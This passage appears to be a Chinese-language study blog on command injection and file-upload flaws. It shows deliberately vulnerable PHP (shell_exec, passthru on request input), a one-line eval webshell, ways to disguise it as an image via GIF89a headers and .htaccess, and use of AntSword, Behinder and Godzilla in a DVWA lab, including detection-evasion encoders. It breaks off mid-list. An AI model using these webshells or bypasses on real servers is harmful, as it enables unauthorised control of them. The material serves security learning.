shell_exec(&quot;dir&quot;.$cmd);</span><br><span class="line">echo &quot;&lt;h3&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">3、测试：</span><br><span class="line">构造语句： | whoami</span><br></pre></td></tr></table></figure><h5 id="4-passthru-函数造成的漏洞"><a href="#4-passthru-函数造成的漏洞" class="headerlink" title="4.passthru()函数造成的漏洞"></a>4.passthru()函数造成的漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1、函数用法：</span><br><span class="line">void passthru (string command, int &amp;return_var)</span><br><span class="line">command 要执行的命令</span><br><span class="line">return_var 存放执行命令后的状态值</span><br><span class="line">同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix</span><br><span class="line">命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system()</span><br><span class="line">函数。</span><br><span class="line">2、环境源码：</span><br><span class="line">&lt;?php</span><br><span class="line">$cmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">if(isset($cmd))&#123;</span><br><span class="line">echo passthru($cmd);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">3、测试</span><br><span class="line">构造语句 cmd=whoami</span><br></pre></td></tr></table></figure><h3 id="扩展：图片马制作流程"><a href="#扩展：图片马制作流程" class="headerlink" title="扩展：图片马制作流程"></a>扩展：图片马制作流程</h3><p><strong>博客连接：<a href="https://www.cnblogs.com/1ink/p/15101706.html">https://www.cnblogs.com/1ink/p/15101706.html</a></strong></p><p>常见的图片马一般是直接将木马文件后缀名更改为jpg或者png文件来达到上传的条件，这里采用另外的几种方法。</p><h5 id="1-notepad-文件打开添加"><a href="#1-notepad-文件打开添加" class="headerlink" title="1.notepad++文件打开添加"></a>1.notepad++文件打开添加</h5><p>文件打开之后由于图片文件无法解析，所以会生成一堆乱码，这里只需要将一句话木马添加在乱码后边保存退出即可。</p><h5 id="2-cmd命令执行合成图片马"><a href="#2-cmd命令执行合成图片马" class="headerlink" title="2.cmd命令执行合成图片马"></a>2.cmd命令执行合成图片马</h5><p>我靠，精灵融合！！！！</p><p>cmd的copy指令和&gt;输出路径管道符可以实现将两个文件复制进同一个文件并输出该文件，所以这里使用以下命令就可以完成图片马的融合制作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cmd中 copy 1.jpg/b+2.php 3.jpg</span><br><span class="line"></span><br><span class="line">- /b是二进制形式打开</span><br><span class="line">- /a是ascii方式打开</span><br><span class="line">- 看到有人说一定要把图片放前面,木马放后面才能成功,我亲自试了这两种制作方式(另一种图片放后面),均能成功连接,但是后者的一句话木马在文件开头,不推荐</span><br><span class="line">（内容来源于博客）</span><br></pre></td></tr></table></figure><h5 id="3-ps"><a href="#3-ps" class="headerlink" title="3.ps"></a>3.ps</h5><p>ps的话是将图片打开之后，将文档简介的文档标题更改为一句话木马，也可以实现完成图片马的制作。</p><h5 id="4-文件欺骗"><a href="#4-文件欺骗" class="headerlink" title="4.文件欺骗"></a>4.文件欺骗</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">在文件欺骗中，如果在文件数据包前加入GIF89的内容，这实际上是一种通过修改文件头部来欺骗系统或应用程序的手段。文件头部通常包含文件的元数据和标识信息，而在这个过程中使用了GIF89是因为它是GIF图像文件的头部标识。</span><br><span class="line"></span><br><span class="line">下面是在文件数据包前加入GIF89实现文件欺骗的原理：</span><br><span class="line"></span><br><span class="line">1. **文件头部结构：** 不同类型的文件有不同的文件头部结构，其中包含了文件的元数据、标识信息和格式信息。在GIF图像文件中，文件头部通常以&quot;89a&quot;开头。</span><br><span class="line">2. **加入GIF89标识：** 攻击者在欺骗过程中将GIF89的标识添加到文件数据包的开头。这可以通过在文件的二进制数据中插入ASCII字符 &quot;GIF89&quot; 或相应的十六进制表示。</span><br><span class="line">3. **混淆文件类型：** 由于加入了GIF89的标识，系统或应用程序可能会误认为这个文件是一个GIF图像文件，而不是其实际的文件类型。这样可以绕过一些基于文件类型识别的安全机制。</span><br><span class="line">4. **文件扩展名不一致：** 攻击者可能会故意修改文件的扩展名，使其与GIF图像文件相符，以进一步欺骗用户和系统。</span><br><span class="line">5. **欺骗用户执行：** 如果攻击者能够使用户相信这个文件是一个图像文件，用户可能会尝试用图像查看器或编辑器打开它，从而执行其中包含的恶意代码。</span><br></pre></td></tr></table></figure><p>所以可以在一句话木马文件前加入GIF89a来实现后缀名为jpg的图片马不被识别出来，并利用.htaccess文件将图片文件更改为php文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps：图片马要注意的一点是，图片尽量不要过大，有的时候图片太大会导致图片上传失败，当然具体失败原因还是要观察js函数要求。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps：.htaccess基础知识*重点内容*</span><br><span class="line">.htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。</span><br><span class="line">启用.htaccess，需要修改httpd.conf，启用AllowOverride，并可以用AllowOverride限制特定命令的使用。如果需要使用.htaccess以外的其他文件名，可以用AccessFileName指令来改变。例如，需要使用.config ，则可以在服务器配置文件中按以下方法配置：AccessFileName .config 。</span><br><span class="line">它里面有这样一段代码：AllowOverride None，如果我们把None改成All</span><br></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p><strong>推荐博客链接：<a href="https://blog.csdn.net/weixin_44268918/article/details/128074253?ops_request_misc=%7B%22request_id%22:%22170651800216800225536986%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=170651800216800225536986&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-128074253-null-null.142%5Ev99%5Epc_search_result_base2&utm_term=%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&spm=1018.2226.3001.4187">文件上传漏洞详解-CSDN博客</a></strong></p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">文件上传漏洞是指攻击者通过利用应用程序或系统中存在的安全漏洞，绕过文件上传的限制，上传恶意文件到服务器。文件上传漏洞的原理如下：</span><br><span class="line"></span><br><span class="line">1. 未正确验证文件类型：应用程序在文件上传时未对文件类型进行严格的验证，导致攻击者可以上传任意类型的文件，包括恶意脚本文件（如PHP、ASP等可执行文件）。</span><br><span class="line">2. 不正确的文件扩展名检查：应用程序可能只检查文件扩展名而不对文件内容进行检查。攻击者可以修改文件的扩展名来绕过检查，将恶意文件伪装成合法文件。</span><br><span class="line">3. 绕过前端验证：前端页面上的上传限制可以被绕过，攻击者可以通过修改请求的属性或使用代理工具等方式，绕过前端的文件上传限制。</span><br><span class="line">4. 绕过后端验证：即使应用程序在前端做了文件上传限制，但后端处理上传文件的代码中存在安全漏洞，攻击者可以通过构造恶意的文件上传请求来绕过后端的验证。</span><br><span class="line">5. 目录穿越漏洞：应用程序在保存上传文件时没有正确处理用户提供的文件路径信息，导致攻击者可以通过构造特殊的文件名来实现目录穿越，将文件保存到其他目录下，甚至执行任意文件读写操作。</span><br><span class="line"></span><br><span class="line">攻击者利用文件上传漏洞可以上传恶意文件到服务器，可能导致以下安全问题：</span><br><span class="line"></span><br><span class="line">- 执行远程代码：攻击者上传的恶意文件（如Web脚本）可能被服务器执行，从而导致远程代码执行漏洞。</span><br><span class="line">- 文件覆盖：攻击者上传的文件可能会覆盖原有的合法文件，导致服务不可用或数据丢失。</span><br><span class="line">- 信息泄露：攻击者上传的文件可能包含敏感信息，泄露给其他人员获取。</span><br><span class="line">- 后门植入：攻击者上传的恶意文件可能包含后门程序，用于持久性访问和控制服务器。</span><br><span class="line"></span><br><span class="line">为了防止文件上传漏洞，应开发安全的文件上传功能，包括但不限于：</span><br><span class="line"></span><br><span class="line">- 对文件类型进行验证，并限制上传的文件类型。</span><br><span class="line">- 对文件内容进行检查，确保上传的文件是合法的。</span><br><span class="line">- 对文件名进行处理，避免目录穿越漏洞。</span><br><span class="line">- 对上传文件进行隔离，将上传的文件保存在独立目录下，并设置适当的文件权限。</span><br><span class="line">- 对上传文件进行安全扫描，检查是否包含恶意内容。</span><br><span class="line">- 定期更新和修补应用程序，以修复可能存在的安全漏洞。</span><br></pre></td></tr></table></figure><p><strong>简单来说原理就是没有对上传文件进行检测过滤，导致上传的文件导致他人能够通过访问该文件并通过某些工具和指令获取信息或者造成危害系统的效果。实现原理则是在页面有文件上传时，没有上传文件检测，这时有心者可以利用一些PHP木马，java木马（统称webshell）等文件来达到拿取类似终端操作系统的效果。</strong></p><p><strong>简单流程总结：上传一句话木马等木马程序，来使当前网页编变成一个和终端一样效果的webshell，之后通过各种命令来继续其他的操作</strong></p><h2 id="文件上传条件"><a href="#文件上传条件" class="headerlink" title="文件上传条件"></a>文件上传条件</h2><h4 id="1-有上传点"><a href="#1-有上传点" class="headerlink" title="1.有上传点"></a>1.有上传点</h4><p><strong>至少要有一个上传文件的地方，这里比较常见的是上传图片（jpg后缀名文件），那么就可以使用图片马来实现木马文件的上传（发明图片![](..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;Eagle Camp&#x2F;授课文件作业&#x2F;web漏洞&#x2F;笔记md文件&#x2F;命令注入与文件上传漏洞原理.assets&#x2F;0072E489.png)的人一定是个人才)。</strong></p><h4 id="2-后端允许恶意文件的上传，或者说我们可以绕过"><a href="#2-后端允许恶意文件的上传，或者说我们可以绕过" class="headerlink" title="2.后端允许恶意文件的上传，或者说我们可以绕过"></a>2.后端允许恶意文件的上传，或者说我们可以绕过</h4><p><strong>如果对方有拦截手段的话，或者没有绕过能力的话，自然gg了。</strong></p><h4 id="3-上传的文件服务器可以执行"><a href="#3-上传的文件服务器可以执行" class="headerlink" title="3.上传的文件服务器可以执行"></a>3.上传的文件服务器可以执行</h4><p><strong>看网站服务器的配置文件，可以运行什么类型的文件，总不能在php的站点上传java的马，服务器试运行不了该文件的，文件执行不了，后续手段更没用了</strong></p><h4 id="4-能访问到上传的文件"><a href="#4-能访问到上传的文件" class="headerlink" title="4.能访问到上传的文件"></a>4.能访问到上传的文件</h4><p><strong>有些服务器是不允许外界访相应文件路径的，这就导致文件在我们手中的操作性就很小了，另外，大多时候文件上传之后是不会回显路径的。</strong></p><h4 id="扩展：路径概念补充"><a href="#扩展：路径概念补充" class="headerlink" title="扩展：路径概念补充"></a><strong>扩展：路径概念补充</strong></h4><p>浏览器访问路径时有以下三种情况：</p><h6 id="1-目录："><a href="#1-目录：" class="headerlink" title="1.目录："></a>1.目录：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">当浏览器访问的路径最终指向一个目录，那么就要看服务器相关权限配置情况</span><br><span class="line"></span><br><span class="line">​（1）该目录可访问，那么浏览器网页最终会返回该目录下的文件</span><br><span class="line"></span><br><span class="line">​（2）如果该目录不可访问，那么浏览网页就会回显404</span><br></pre></td></tr></table></figure><h6 id="2-代码块"><a href="#2-代码块" class="headerlink" title="2.代码块"></a>2.代码块</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当浏览器访问的路径最终指向一个代码块，那么该代码就会被执行，并将执行结果打包进响应体中返回</span><br></pre></td></tr></table></figure><h6 id="3-文件"><a href="#3-文件" class="headerlink" title="3.文件"></a>3.文件</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">就要看文件的类型了，如果是可执行的文件（服务器是否配置过相关插件），服务器会优先将可执行的文件执行，并将结果封装进响应体中返回，如果是不可执行的文件，则服务器会将整个文件封装进响应体中返回。</span><br></pre></td></tr></table></figure><h2 id="简单手工实操"><a href="#简单手工实操" class="headerlink" title="简单手工实操"></a>简单手工实操</h2><h4 id="1-准备要上传的文件，木马，工具"><a href="#1-准备要上传的文件，木马，工具" class="headerlink" title="1.准备要上传的文件，木马，工具"></a><strong>1.准备要上传的文件，木马，工具</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶场：DVWA（low）</span><br><span class="line"></span><br><span class="line">上传文件：这里使用简单的一句话木马&lt;?php @eval($_POST[&#x27;1&#x27;]);?&gt;，写入txt记事本中，将后缀名改为PHP，之后进行文件上传。(这里的木马目的是控制名为1的参数的值，那么当我们输入1=某些命令时，则该命令就会被执行。)</span><br><span class="line"></span><br><span class="line">工具：Hackbar V2</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182445962.png" class="" title="image-20240905182445962"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182454966.png" class="" title="image-20240905182454966"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182501805.png" class="" title="image-20240905182501805"><h4 id="2-上传木马，记录木马路径"><a href="#2-上传木马，记录木马路径" class="headerlink" title="2.上传木马，记录木马路径"></a><strong>2.上传木马，记录木马路径</strong></h4><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182509265.png" class="" title="image-20240905182509265"><h4 id="3-访问文件路径，并输入1-phpinfo（）来查看文件是否起作用"><a href="#3-访问文件路径，并输入1-phpinfo（）来查看文件是否起作用" class="headerlink" title="3.访问文件路径，并输入1&#x3D;phpinfo（）来查看文件是否起作用"></a>3.访问文件路径，并输入1&#x3D;phpinfo（）来查看文件是否起作用</h4><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182522050.png" class="" title="image-20240905182522050"><p>这里可以看到木马已成功植入，可以进行下一步操作。</p><h4 id="4-简单命令操作"><a href="#4-简单命令操作" class="headerlink" title="4.简单命令操作"></a>4.简单命令操作</h4><p><strong>这里要注意的是，如果要执行命令，则等号后的值要用system（）包裹，因为这是以php写的木马程序，所以只会执行php代码。</strong></p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182529983.png" class="" title="image-20240905182529983"><h2 id="常见webshell管理工具"><a href="#常见webshell管理工具" class="headerlink" title="常见webshell管理工具"></a>常见webshell管理工具</h2><h3 id="蚁剑（AntSword）"><a href="#蚁剑（AntSword）" class="headerlink" title="蚁剑（AntSword）"></a>蚁剑（AntSword）</h3><h4 id="主要功能："><a href="#主要功能：" class="headerlink" title="主要功能："></a>主要功能：</h4><p>能够连接常见php和jsp的webshell，并提供管理面板。（蚁剑是最新版本也就是最近几个月的版本更新了jsp的webshell。）</p><h4 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h4><p>下载完成后打开蚁剑启动器开始初始化，选中主要代码路径（这里不知道为什么，我必须要挂梯子才能初始化完成，这里推测是github项目的问题，可能部分的源码没给，要从github上下载。）</p><h4 id="使用功能详解"><a href="#使用功能详解" class="headerlink" title="使用功能详解"></a>使用功能详解</h4><p><strong>使用教程:</strong><a href="https://blog.csdn.net/weixin_41924764/article/details/108099952">中国蚁剑(AntSword)安装、使用教程_中国蚁剑使用教程-CSDN博客</a></p><h6 id="1-首先点开webshell界面后点击添加数据"><a href="#1-首先点开webshell界面后点击添加数据" class="headerlink" title="1.首先点开webshell界面后点击添加数据"></a>1.首先点开webshell界面后点击添加数据</h6><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182543615.png" class="" title="image-20240905182543615"><h6 id="2-基础配置栏"><a href="#2-基础配置栏" class="headerlink" title="2.基础配置栏"></a>2.基础配置栏</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url地址：文件上传后的url路径地址</span><br><span class="line"></span><br><span class="line">连接密码：上传的木马文件的post参数中的值 [比如这里的一句话木马&lt;?php @eval($_GET[&#x27;qwe&#x27;]);?&gt;的连接密码就是qwe] （这里要注意的一点是，蚁剑的特殊设定导致特上传的木马文件必须要是post参数的）【GET参数马蚁剑密码失效解决办法：在蚁剑连接的url处构造post参数使密码可以生效，例如在http://192.168.149.131:8080/hackable/uploads/1.php后边加上?1=eval($_POST[&#x27;2&#x27;]);之后再将密码更改为post参数中的值就可以了。】</span><br><span class="line"></span><br><span class="line">编码设置：这里则是要根据网页的编码来进行设置</span><br><span class="line"></span><br><span class="line">连接类型：还是拿一句话木马[&lt;?php @eval($_GET[&#x27;qwe&#x27;]);?&gt;]举例，这里的连接类型用到了@eval也就是php中的函数，所以网页是php型的网站，所以这里下图中的连接类型选择php</span><br><span class="line"></span><br><span class="line">编码器：根据博客内容，编码器用来进行免杀绕过，将内容进行编码，以此来绕过某些网站安全工具的检测，从而达到渗透效果。</span><br></pre></td></tr></table></figure><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182553244.png" class="" title="image-20240905182553244"><h6 id="3-请求信息"><a href="#3-请求信息" class="headerlink" title="3.请求信息"></a>3.请求信息</h6><p>请求信息栏主要服务于某些会在请求头或者请求体中设置特殊参数（自定字段，cookie，登录凭证）的网站，由于如果没有这些特殊参数则网站无法正常访问，所以，需要在这里添加这些参数，来进行正常渗透行动。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182601849.png" class="" title="image-20240905182601849"><h6 id="4-其他设置"><a href="#4-其他设置" class="headerlink" title="4.其他设置"></a>4.其他设置</h6><p>这里的其他设置就看个人要用到哪些东西了（比如后续的绕过之类的）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182610618.png" class="" title="image-20240905182610618"><h6 id="5-简单连接"><a href="#5-简单连接" class="headerlink" title="5.简单连接"></a>5.简单连接</h6><p>一般上完马，配置好基础配置就可以添加数据了，之后双击连接，这里可以看到蚁剑也是十分人性化的添加了物理位置</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182619691.png" class="" title="image-20240905182619691"><p>双击之后，我们可以看到已经是拿到了目标的网站目录了，左边是网站的整体目录结构，右边则是当前文件夹的文件内容，这里也是无意间看到网站flag</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182629118.png" class="" title="image-20240905182629118"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182637947.png" class="" title="image-20240905182637947"><h6 id="6-打开shell面板"><a href="#6-打开shell面板" class="headerlink" title="6.打开shell面板"></a>6.打开shell面板</h6><p>这里的终端是由蚁剑来构造的一个终端，（这里要注意的是，我们写的马拿到的一般都是普通权限，想要高权限的话要进行提权。）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182647060.png" class="" title="image-20240905182647060"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182653742.png" class="" title="image-20240905182653742"><h6 id="7-数据操作"><a href="#7-数据操作" class="headerlink" title="7.数据操作"></a>7.数据操作</h6><p>数据操作可以让我们连接到数据库，但是要注意的是，连接的前提是数据库开启了远程连接。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182700823.png" class="" title="image-20240905182700823"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182707873.png" class="" title="image-20240905182707873"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182719577.png" class="" title="image-20240905182719577"><h3 id="冰蝎（Behinder）"><a href="#冰蝎（Behinder）" class="headerlink" title="冰蝎（Behinder）"></a>冰蝎（Behinder）</h3><h4 id="主要功能：-1"><a href="#主要功能：-1" class="headerlink" title="主要功能："></a>主要功能：</h4><p>能够连接常见php和jsp的webshell，并提供管理面板，提供加密的webshell。</p><h4 id="使用功能详解-1"><a href="#使用功能详解-1" class="headerlink" title="使用功能详解"></a>使用功能详解</h4><h6 id="1-文件打开方式"><a href="#1-文件打开方式" class="headerlink" title="1.文件打开方式"></a>1.文件打开方式</h6><p>命令行输入java -jar 文件名，这里的话因为java环境配的还不错，所以我可以双击打开，这里直接快捷方式。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182727986.png" class="" title="image-20240905182727986"><h6 id="2-冰蝎webshell"><a href="#2-冰蝎webshell" class="headerlink" title="2.冰蝎webshell"></a>2.冰蝎webshell</h6><p>冰蝎和哥斯拉不同的是他不会提供木马生成工具，但是他提供了木马模板（这里要注意的是在更改密钥时要将新密钥进行32位的md5加密并截取前16位填入木马模板中来达到更换密钥的效果）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182746153.png" class="" title="image-20240905182746153"><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182754725.png" class="" title="image-20240905182754725"><h6 id="3-传马连接"><a href="#3-传马连接" class="headerlink" title="3.传马连接"></a>3.传马连接</h6><p>这里的连接密码就是你自己定义的连接密钥，之后点击保存后双击url就可以进行连接了</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182803691.png" class="" title="image-20240905182803691"><p>这里冰蝎有一个很吊的功能就是注入内存马，内存马相对于文件马来说更难的查杀，所以它的潜伏性更强。（但是目前冰蝎的内存马只支持java）</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182812279.png" class="" title="image-20240905182812279"><h3 id="哥斯拉（Godzilla）"><a href="#哥斯拉（Godzilla）" class="headerlink" title="哥斯拉（Godzilla）"></a>哥斯拉（Godzilla）</h3><h4 id="主要功能：-2"><a href="#主要功能：-2" class="headerlink" title="主要功能："></a>主要功能：</h4><p>能够连接常见php和jsp的webshell，并提供管理面板，可以生成加密的webshell。</p><h4 id="使用功能详解-2"><a href="#使用功能详解-2" class="headerlink" title="使用功能详解"></a>使用功能详解</h4><h6 id="1-启动流程"><a href="#1-启动流程" class="headerlink" title="1.启动流程"></a>1.启动流程</h6><p>首先哥斯拉只有一个jar包，正常启动流程应该是在那个位置打开命令行也就是终端，之后输入java -jar 文件名打开，但是有些java环境可以直接双击打开jar包，所以我直接设置快捷方式，但是弊端就是无法查看文件打不开的原因，查看不了报错信息。</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240131235705605.png" class="" title="image-20240131235705605"><p>正常流程</p><img src="/2024/09/05/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9B%B8%E5%85%B3%E5%AD%A6%E4%B9%A0/image-20240905182828897.png" class="" title="image-20240905182828897"><h6 id="2-管理生成"><a href="#2-管理生成" class="headerlink" title="2.管理生成"></a>2.管理生成</h6><p>管理生成模块主要用来生成webshell文件的（生成木马文件的），这里的选项作用如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">密码：和蚁剑一样，这里的密码指的是post参数中包裹的值</span><br><span class="line"></span><br><span class="line">密钥：这里的密钥则是为加密器服务的，加密器不同类型生成的马有些是需要密钥的</span><br><span class="line"></span><br><span class="line">有效载荷：网页类型，这里使用的靶场是php页面，所以这里选择php</span><br><span class="line"></span><br><span 